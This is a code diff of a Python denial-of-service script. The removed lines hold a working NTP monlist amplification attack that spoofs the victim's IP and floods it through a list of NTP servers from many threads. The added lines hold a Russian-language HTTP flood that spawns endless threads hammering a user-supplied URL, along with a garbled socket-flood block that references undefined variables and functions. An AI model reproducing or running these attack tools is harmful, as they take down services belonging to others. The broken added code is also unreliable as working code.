@@ -1,12 +1,26 @@
-1import urllib2
-import sys
-import threading
-import random
-import re
-import os
+"import httpx"
+"import pystyle"
+"import socks"
+"import pysocks"
+"import requests"
+"import icmplib"
+"import dnspython"
+"import cloudscraper"
+"import colorama"
+"import shutup"
+"import undetected_chromedriver"
+"import psutil"
+"import flask"
+"import wget"
+# DDoS
 import colorama
+import threading
+import requests
+import random
+import os
+import sys
 import time
-import scapy
+import undetected_chromedriver
 # Colors
 yellow='\033[92m'
 cyan='\033[92m'
@@ -22,68 +36,36 @@ print(green + f"З А Г Р У З К А....")
 time.sleep(1.5)
 os.system("clear")
 
-#packet sender
-def deny():
-#Import globals to function
-global ntplist
-global currentserver
-global data
-global target
-ntpserver = ntplist[currentserver] #Get new server
-currentserver = currentserver + 1 #Increment for next
-packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
-send(packet,loop=1) #SEND IT
+print( '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
 
-#So I dont have to have the same stuff twice
-def printhelp():
-print "Amplification DOS Attack"
-print "Usage mbr.py <target ip> <ntpserver list> <number of threads>"
-print "ex: ex: ntpdos.py 1.2.3.4 file.txt 10"
-print "NTP serverlist file should contain one IP per line"
-exit(0)
+targ = input("Cсылку для атаки: ")
 
-if len(sys.argv) < 4:
-printhelp()
-#Fetch Args
-target = sys.argv[1]
+def dos():
+ while True:
+  requests.get(targ)
+  print("[+] Заход на сайт выполнен!")
+  
+while True:
+ threading.Thread(target=dos).start()
 
-#Help out idiots
-if target in ("help","-h","h","?","--h","--help","/?"):
-printhelp()
+# DDoS
+print(  "Zapusk")
+while True:
+    try:
+        s = socket.socket(999999999)
+        s.connect((upl, int(theard)))
+        sent +=0
+        print(green + f"[LOG] GO {sent} ")
+        print("DDoS")
+    except OSError: 
+        error +=1
+        print(pink + f"[LOG] PACKETS {error}")
+        "print(cyan + f( DDoS)"
 
-ntpserverfile = sys.argv[2]
-numberthreads = int(sys.argv[3])
-#System for accepting bulk input
-ntplist = []
-currentserver = 0
-with open(ntpserverfile) as f:
-    ntplist = f.readlines()
-
-#Make sure we dont out of bounds
-if numberthreads > int(len(ntplist)):
-print "Attack Aborted: More threads than servers"
-print "Next time dont create more threads than servers"
-exit(0)
-
-#Magic Packet aka NTP v2 Monlist Packet
-data = "\x17\x00\x03\x2a" + "\x00" * 4
-
-#Hold our threads
-threads = []
-print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
-print "Use CTRL+C to stop attack"
-
-#Thread spawner
-for n in range(numberthreads):
-    thread = threading.Thread(target=deny)
-    thread.daemon = True
-    thread.start()
-
-    threads.append(thread)
-
-#In progress!
-print "Sending..."
-
-#Keep alive so ctrl+c still kills all them threads
+#Ctrl+c still kills threads
+print("CTRL+C to stop attack")
 while True:
 time.sleep(1)
+
+if __name__ == '__main__':
+	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco. 
